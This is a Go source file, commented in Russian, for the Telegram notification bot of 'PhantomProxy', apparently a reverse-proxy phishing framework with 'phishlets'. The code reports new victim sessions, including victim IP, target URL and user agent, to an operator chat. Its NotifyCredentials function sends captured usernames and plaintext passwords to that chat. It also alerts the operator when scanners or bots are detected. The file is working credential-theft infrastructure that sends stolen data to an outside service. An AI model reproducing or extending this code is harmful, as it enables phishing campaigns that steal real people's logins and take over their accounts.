package telegram

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"time"

	tb "gopkg.in/telebot.v3"
	"go.uber.org/zap"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
)

// Bot Telegram бот для уведомлений
type Bot struct {
	mu       sync.RWMutex
	bot      *tb.Bot
	logger   *zap.Logger
	db       *database.Database
	enabled  bool
	chatID   int64
	sessionChan chan *database.Session
}

// Config конфигурация бота
type Config struct {
	Token  string `yaml:"token"`
	ChatID int64  `yaml:"chat_id"`
	Enabled bool `yaml:"enabled"`
}

// NewBot создаёт новый Telegram бот
func NewBot(config *Config, db *database.Database, logger *zap.Logger) (*Bot, error) {
	if !config.Enabled || config.Token == "" {
		logger.Info("Telegram bot disabled")
		return &Bot{
			enabled: false,
			logger:  logger,
			db:      db,
		}, nil
	}

	// Создание бота
	bot, err := tb.NewBot(tb.Settings{
		Token:  config.Token,
		Poller: &tb.LongPoller{Timeout: 10 * time.Second},
	})
	if err != nil {
		return nil, fmt.Errorf("failed to create bot: %w", err)
	}

	b := &Bot{
		bot:         bot,
		logger:      logger,
		db:          db,
		enabled:     true,
		chatID:      config.ChatID,
		sessionChan: make(chan *database.Session, 100),
	}

	// Регистрация обработчиков
	b.setupHandlers()

	logger.Info("Telegram bot initialized",
		zap.Int64("chat_id", config.ChatID))

	return b, nil
}

// setupHandlers настраивает обработчики команд
func (b *Bot) setupHandlers() {
	// Команда /start
	b.bot.Handle("/start", func(c tb.Context) error {
		return c.Send(
			"👋 *PhantomProxy Bot*\n\n" +
				"Доступные команды:\n" +
				"/stats - Статистика\n" +
				"/sessions - Последние сессии\n" +
				"/help - Помощь",
			tb.ModeMarkdown,
		)
	})

	// Команда /stats
	b.bot.Handle("/stats", func(c tb.Context) error {
		return b.handleStats(c)
	})

	// Команда /sessions
	b.bot.Handle("/sessions", func(c tb.Context) error {
		return b.handleSessions(c)
	})

	// Команда /help
	b.bot.Handle("/help", func(c tb.Context) error {
		return c.Send(
			"📖 *Помощь*\n\n" +
				"*Команды:*\n" +
				"/start - Запустить бота\n" +
				"/stats - Показать статистику\n" +
				"/sessions - Последние 5 сессий\n" +
				"/help - Эта справка\n\n" +
				"*Уведомления:*\n" +
				"Бот автоматически отправляет уведомления о:\n" +
				"- Новых сессиях\n" +
				"- Захваченных креденшалах\n" +
				"- Подозрительной активности",
			tb.ModeMarkdown,
		)
	})

	// Обработка текстовых сообщений
	b.bot.Handle(tb.OnText, func(c tb.Context) error {
		return b.handleMessage(c)
	})
}

// handleStats обрабатывает команду /stats
func (b *Bot) handleStats(c tb.Context) error {
	stats, err := b.db.GetStats()
	if err != nil {
		return c.Send("❌ Ошибка получения статистики")
	}

	msg := fmt.Sprintf(
		"📊 *Статистика PhantomProxy*\n\n"+
			"👥 Сессии:\n"+
			"  • Всего: `%d`\n"+
			"  • Активные: `%d`\n"+
			"  • Захваченные: `%d`\n\n"+
			"🔑 Креденшалы: `%d`\n"+
			"🎣 Phishlets: `%d`",
		getInt(stats["total_sessions"]),
		getInt(stats["active_sessions"]),
		getInt(stats["captured_sessions"]),
		getInt(stats["total_credentials"]),
		getInt(stats["active_phishlets"]),
	)

	return c.Send(msg, tb.ModeMarkdown)
}

// handleSessions обрабатывает команду /sessions
func (b *Bot) handleSessions(c tb.Context) error {
	sessions, err := b.db.ListSessions(5, 0)
	if err != nil {
		return c.Send("❌ Ошибка получения сессий")
	}

	if len(sessions) == 0 {
		return c.Send("📭 Нет активных сессий")
	}

	var msg strings.Builder
	msg.WriteString("🔹 *Последние сессии:*\n\n")

	for i, s := range sessions {
		msg.WriteString(fmt.Sprintf(
			"*%d.* `%s`\n"+
				"  IP: `%s`\n"+
				"  Target: `%s`\n"+
				"  State: `%s`\n"+
				"  Time: `%s`\n\n",
			i+1,
			s.ID[:8],
			s.VictimIP,
			s.TargetURL,
			s.State,
			s.CreatedAt.Format("15:04:05"),
		))
	}

	return c.Send(msg.String(), tb.ModeMarkdown)
}

// handleMessage обрабатывает текстовые сообщения
func (b *Bot) handleMessage(c tb.Context) error {
	text := c.Message().Text
	
	switch strings.ToLower(text) {
	case "привет", "hi", "hello":
		return c.Send("👋 Привет! Используйте /help для списка команд.")
	default:
		return c.Send("❓ Неизвестная команда. Используйте /help.")
	}
}

// Start запускает бота
func (b *Bot) Start(ctx context.Context) error {
	if !b.enabled {
		return nil
	}

	b.logger.Info("Starting Telegram bot")

	// Запуск поллера
	go func() {
		b.bot.Start()
	}()

	// Запуск обработчика сессий
	go b.processSessions()

	// Graceful shutdown
	go func() {
		<-ctx.Done()
		b.Stop()
	}()

	return nil
}

// Stop останавливает бота
func (b *Bot) Stop() {
	if !b.enabled {
		return
	}

	b.logger.Info("Stopping Telegram bot")
	b.bot.Stop()
	close(b.sessionChan)
}

// NotifySession отправляет уведомление о новой сессии
func (b *Bot) NotifySession(session *database.Session) {
	if !b.enabled {
		return
	}

	select {
	case b.sessionChan <- session:
	default:
		b.logger.Warn("Session channel full, dropping notification")
	}
}

// processSessions обрабатывает уведомления о сессиях
func (b *Bot) processSessions() {
	for session := range b.sessionChan {
		b.sendSessionNotification(session)
	}
}

// sendSessionNotification отправляет уведомление
func (b *Bot) sendSessionNotification(session *database.Session) {
	msg := fmt.Sprintf(
		"🎯 *Новая сессия!*\n\n"+
			"ID: `%s`\n"+
			"IP: `%s`\n"+
			"Target: `%s`\n"+
			"User-Agent: `%s`\n"+
			"Time: `%s`",
		session.ID[:8],
		session.VictimIP,
		session.TargetURL,
		truncate(session.UserAgent, 50),
		session.CreatedAt.Format("2006-01-02 15:04:05"),
	)

	if _, err := b.bot.Send(
		&tb.Chat{ID: b.chatID},
		msg,
		tb.ModeMarkdown,
		tb.NoPreview,
	); err != nil {
		b.logger.Error("Failed to send notification",
			zap.Error(err),
			zap.String("session_id", session.ID))
	}
}

// NotifyCredentials отправляет уведомление о захваченных креденшалах
func (b *Bot) NotifyCredentials(session *database.Session, creds *database.Credentials) {
	if !b.enabled {
		return
	}

	msg := fmt.Sprintf(
		"🔐 *Захвачены креденшалы!*\n\n"+
			"Session: `%s`\n"+
			"Username: `%s`\n"+
			"Password: `%s`\n"+
			"Time: `%s`",
		session.ID[:8],
		creds.Username,
		creds.Password,
		creds.CapturedAt.Format("2006-01-02 15:04:05"),
	)

	if _, err := b.bot.Send(
		&tb.Chat{ID: b.chatID},
		msg,
		tb.ModeMarkdown,
		tb.NoPreview,
	); err != nil {
		b.logger.Error("Failed to send credentials notification",
			zap.Error(err))
	}
}

// NotifyBotDetection отправляет уведомление о детекте бота
func (b *Bot) NotifyBotDetection(session *database.Session, confidence float32) {
	if !b.enabled {
		return
	}

	msg := fmt.Sprintf(
		"🤖 *Detected Bot!*\n\n"+
			"Session: `%s`\n"+
			"IP: `%s`\n"+
			"Confidence: `%.2f%%`\n"+
			"Time: `%s`",
		session.ID[:8],
		session.VictimIP,
		confidence*100,
		time.Now().Format("2006-01-02 15:04:05"),
	)

	if _, err := b.bot.Send(
		&tb.Chat{ID: b.chatID},
		msg,
		tb.ModeMarkdown,
		tb.NoPreview,
	); err != nil {
		b.logger.Error("Failed to send bot detection notification",
			zap.Error(err))
	}
}

// SendMessage отправляет произвольное сообщение
func (b *Bot) SendMessage(text string) error {
	if !b.enabled {
		return nil
	}

	_, err := b.bot.Send(
		&tb.Chat{ID: b.chatID},
		text,
		tb.NoPreview,
	)
	return err
}

// SendMessageMarkdown отправляет сообщение в Markdown формате
func (b *Bot) SendMessageMarkdown(text string) error {
	if !b.enabled {
		return nil
	}

	_, err := b.bot.Send(
		&tb.Chat{ID: b.chatID},
		text,
		tb.ModeMarkdown,
		tb.NoPreview,
	)
	return err
}

// Вспомогательные функции

func getInt(v interface{}) int {
	switch val := v.(type) {
	case int:
		return val
	case int64:
		return int(val)
	case float64:
		return int(val)
	default:
		return 0
	}
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// GetStats возвращает статистику бота
func (b *Bot) GetStats() map[string]interface{} {
	return map[string]interface{}{
		"enabled": b.enabled,
		"chat_id": b.chatID,
	}
}

// IsEnabled возвращает статус бота
func (b *Bot) IsEnabled() bool {
	return b.enabled
}

// UpdateChatID обновляет ChatID
func (b *Bot) UpdateChatID(chatID int64) {
	b.mu.Lock()
	defer b.mu.Unlock()
	
	b.chatID = chatID
	b.logger.Info("Telegram bot chat ID updated",
		zap.Int64("chat_id", chatID))
}
